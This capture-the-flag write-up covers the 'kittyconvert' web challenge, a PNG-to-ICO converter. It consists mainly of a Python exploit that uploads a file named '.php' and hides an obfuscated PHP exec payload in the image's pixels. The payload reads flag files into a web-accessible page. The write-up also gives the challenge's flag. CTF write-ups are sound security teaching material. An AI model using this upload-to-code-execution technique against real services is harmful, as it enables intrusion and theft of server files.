https://ctftime.org/event/2467

# kittyconvert (Web)
php converter png -> ico

## Solution
This challenge has two parts, a bug on the filename that allows us to upload a file called `.php` and how to write the actual payload to it.

```python
from PIL import Image
import requests

REMOTE = "https://ced03a4e-6413-4ee4-85b7-dcbbb5d5ddeb.x3c.tf:1337/"

def run():
    png = "new.png"
    width, height = 32, 32
    image = Image.new("RGBA", (width, height))

    # for c in range(256):
    payload = '<?php ex' + \
              'ec( ' + \
              '\'cat' + \
              ' /f*' + \
              ' >/v' + \
              'ar/"' + \
              'www"' + \
              '/ht"' + \
              '"ml"' + \
              '"/ab' + \
              '.php' + \
              '\' ) ' + \
              f';{chr(35)}  '

    final = ""
    idx = 0
    for i in range(int(len(payload)/4)):
        color = list(payload[idx:idx+4])
        idx += 4

        tmp = color[0]
        color[0] = color[2]
        color[2] = tmp
        color = "".join(color)

        final = final + ("AAAA" * 31)
        final = final + color


    final = final + "A" * (4096 - len(final))

    idx = 0
    for x in range(width):
        for y in range(height):
            color = tuple(ord(c) for c in final[idx:idx+4])
            idx += 4
            image.putpixel((x, y), color)
    
    image.save(png)

    res = requests.post(
       REMOTE,
       files={"file": (".php", open(png, "rb").read()), "submit": "Convert"},
    )
    res = requests.get(
       REMOTE + "/uploads/.php",
    )
    res = requests.get(
       REMOTE + "/ab.php",
    )
    print(f"DEBUGPRINT[17]: lab.py:58: res.text={res.text}")

image = run()
```

## Flag
`x3c{b1tm4p5_4r3_s1mpl3_6u7_7h3_4lph4_1s_w31rd}`

shafouz 2025/01/26
